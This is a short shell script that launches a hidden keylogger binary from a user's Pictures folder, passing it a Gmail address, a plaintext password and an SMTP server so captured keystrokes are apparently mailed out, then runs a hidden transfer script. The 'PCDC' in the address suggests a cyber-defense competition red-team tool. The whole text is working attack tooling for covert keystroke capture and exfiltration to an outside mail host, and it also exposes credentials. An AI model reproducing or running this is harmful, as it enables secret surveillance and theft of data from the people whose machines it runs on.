cd /home/cpuser/Pictures/
timeout 5 ./.keylogger keyloggerforPCDC@gmail.com ThisIsAGoodPassword smtp.gmail.com:587 tls 1
echo Starting transfer
exec /home/cpuser/Pictures/.transfer.sh
exit
